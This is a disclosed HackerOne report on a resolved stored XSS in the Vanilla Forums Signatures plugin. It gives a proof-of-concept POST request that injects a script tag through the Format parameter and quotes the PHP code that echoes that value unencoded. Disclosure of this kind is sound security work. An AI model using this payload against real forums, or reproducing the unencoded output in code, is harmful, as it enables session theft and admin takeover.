---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '413828'
original_report_id: '413828'
title: Persistent XSS via Signatures
weakness: Cross-site Scripting (XSS) - Stored
team_handle: vanilla
created_at: '2018-09-25T10:58:11.176Z'
disclosed_at: '2019-04-06T11:17:06.471Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 28
asset_identifier: '*.vanillaforums.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-stored
---

# Persistent XSS via Signatures

## Metadata

- HackerOne Report ID: 413828
- Weakness: Cross-site Scripting (XSS) - Stored
- Program: vanilla
- Disclosed At: 2019-04-06T11:17:06.471Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Description
-----------

The current version of the signature plugin (1.6.1) is vulnerable to persistent XSS as the `Format` parameter is echoed without encoding. 

POC
---

Prerequisite: Enable the Signatures plugin

To place the payload, the following request can be used (it's simply the request that is send when changing a signature, with an XSS payload in the `Format` parameter):

    POST /vanilla-2.6.1/profile/signature HTTP/1.1
    [...]

    TransientKey=[...]&hpt=&Format=html'"><script>alert(1)</script>&Body=signature&Checkboxes%5B%5D=Plugin.Signatures.HideAll&Checkboxes%5B%5D=Plugin.Signatures.HideImages&Save=Save

To trigger the payload, simply view a post by the user with a malicious signature.

Code
----

    /plugins/Signatures/class.signatures.plugin.php
    $userSignature = Gdn_Format::to($signature, $sigFormat)."<!-- $sigFormat -->";
    [...]
    echo "<div class=\"Signature UserSignature userContent {$sigClasses}\">{$userSignature}</div>

## Impact

Successful exploitation allows an attacker to read any data the attacked user has access to, or to perform arbitrary requests the user can perform.

If the attacked user is an administrator, the attacker could for example add a new admin user and thus gain full access to the application.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
